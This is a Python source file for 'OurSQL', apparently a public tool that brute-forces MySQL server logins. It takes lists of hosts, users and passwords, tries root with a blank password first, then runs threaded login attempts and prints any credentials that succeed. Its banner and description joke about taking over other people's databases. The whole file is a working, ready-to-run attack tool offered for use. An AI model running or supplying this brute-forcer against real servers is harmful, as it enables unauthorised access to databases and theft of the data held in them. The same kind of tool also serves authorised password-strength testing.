#!/usr/bin/env python3
# By Aqhmal (https://github.com/aqhmal)

import sys
import argparse
import MySQLdb
from os import path
from time import sleep
from datetime import datetime
from threading import Thread, activeCount

# Default status variables.
success = False
allowed = True
connectable = True
lost_connection = False
unknown = False

# Get version.
def getVersion():
	return "1.1"

# Get current time.
def curTime():
	now = datetime.now()
	return now.strftime("%d/%m/%Y %H:%M:%S")

# Show script banner.
def showBanner():
	print("\n\033[1;1m ██████╗ ██╗   ██╗██████╗ ███████╗ ██████╗ ██╗")
	print("██╔═══██╗██║   ██║██╔══██╗██╔════╝██╔═══██╗██║")
	print("██║   ██║██║   ██║██████╔╝███████╗██║   ██║██║")
	print("██║   ██║██║   ██║██╔══██╗╚════██║██║▄▄ ██║██║")
	print("╚██████╔╝╚██████╔╝██║  ██║███████║╚██████╔╝███████╗")
	print(" ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝\033[0;m")
	print("\033[1;95m-----> \"Comrade, Your MySQL is now OurSQL\" <-----\033[0;m ", end="")
	print("(v{})\n".format(getVersion()))

# Show success message.
def showSuccess(msg):
	print("\033[1;92m[{}] [+] {}\033[0;m".format(curTime(), msg))

# Show fail message.
def showFailure(msg):
	print("\033[1;91m[{}] [-] {}\033[0;m".format(curTime(), msg))

# Show information message.
def showInfo(msg):
	print("\033[1;1m[{}] [*] {}\033[0;m".format(curTime(), msg))

# Show verbose message.
def showVerbose(msg):
	print("\033[1;0m[{}] [#] {}\033[0;m".format(curTime(), msg))

# Check if file exists.
def file_exists(parser, file):
	if not path.exists(file):
		parser.error("File not found ({})".format(file))
	return [x.strip() for x in open(file)]

# Exit script.
def exitScript():
	showInfo("Exiting OurSQL")
	sys.exit()

# Connect to the MySQL Server.
def connect(host, user, password, port, timeout):
	global verbose, success, allowed, connectable, unknown
	try:
		if verbose:
			showVerbose("Testing {} : {}".format(user, password))
		MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=timeout)
		success = True
		showSuccess("Login success! {} : {}".format(user, password))
		showSuccess("Successfully made their MySQL into OurSQL!")
	except Exception as e:
		errno, message = e.args
		if errno == 1045:
			if verbose:
				showFailure("Login failed! {} : {}".format(user, password))
		elif errno == 1130:
			allowed = False
		elif errno == 2002:
			connectable = False
		elif errno == 2005:
			unknown = True
		elif errno == 2013:
			lost_connection = False
		else:
			showFailure("Code: {}, Message: {}".format(errno, message))
			exitScript()

# Script main()
def main(args, users, hosts):
	try:
		global success, allowed, honeypot, connectable, lost_connection, unknown
		port = args.port
		timeout = args.timeout
		max_threads = args.threads
		# Cleaning some argument attributes
		del args.port, args.timeout, args.threads
		for host in hosts:
			showInfo("Targeting {}".format(host))
			# Test with blank password if we're allowed to connect to the server
			showInfo("Checking if {}:{} allow us to connect".format(host, port))
			connect(host, "root", "", port, timeout)
			if not connectable or lost_connection:
				showFailure("сука блять! Unable to connect to {}:{}".format(host, port))
				connectable = True
				lost_connection = False
				continue
			if not allowed:
				showFailure("сука блять! Host {}:{} doesn't allow us to access their MySQL!".format(host, port))
				allowed = True
				continue
			if unknown:
				showFailure("сука блять! Unknown host {}!".format(host))
				unknown = False
				continue
			showInfo("Starting brute-force")
			for user in users:
				showInfo("Targeting user {}".format(user))
				if verbose:
					showVerbose("Using {} connection threads".format(max_threads))
				with open(args.passwords) as file:
					for password in file:
						if success:
							break
						th = Thread(target=connect, args=(host, user, password.strip(), port, timeout))
						th.daemon = True
						th.start()
						while activeCount() > max_threads:
							sleep(0.001)
					while activeCount() > 1:
						sleep(0.001)
				if success:
					success = False
				else:
					showFailure("сука блять! Unable to find password for user {}".format(user))
		exitScript()
	except KeyboardInterrupt:
		exitScript()

if __name__ == "__main__":
	try:
		showBanner()
		desc = "MySQL brute-force script. Some say that KGB used this script during the Cold War."
		args = argparse.ArgumentParser(description=desc)
		args.add_argument("-H", "--host", dest="host", type=str, default="localhost", help="single domain or IP Address to be brute-force (default: localhost)")
		args.add_argument("--hosts", dest="hosts", type=lambda x:file_exists(args, x), help="the list of domains or IP Addresses to be brute-force")
		args.add_argument("-u", "--user", dest="user", type=str, default="root", help="the user to be used during brute-force (default: root)")
		args.add_argument("-U", "--users", dest="users", type=lambda x:file_exists(args, x), help="the list of users to be used during brute-force")
		args.add_argument("-p", "--passwords", dest="passwords", type=str, required=True, help="file containing passwords dictionary")
		args.add_argument("-P", "--port", dest="port", type=int, default=3306, help="the server MySQL port (default: 3306)")
		args.add_argument("-t", "--threads", dest="threads", type=int, default=4, help="number of connection threads (default: 4)")
		args.add_argument("-T", "--timeout", dest="timeout", type=int, default=3, help="total of seconds to connection timeout (default: 3)")
		args.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="show all informational messages")
		args = args.parse_args()
		# Add hosts into list.
		if args.hosts is not None:
			hosts = args.hosts
		else:
			hosts = [args.host]
		# Add users into list.
		if args.users is not None:
			users = args.users
		else:
			users = [args.user]
		verbose = args.verbose
		timeout = args.timeout
		# Cleaning up some argument attributes.
		del args.host, args.hosts, args.verbose, args.user, args.users
		showInfo("Starting OurSQL")
		main(args, users, hosts)
	except KeyboardInterrupt:
		exitScript()
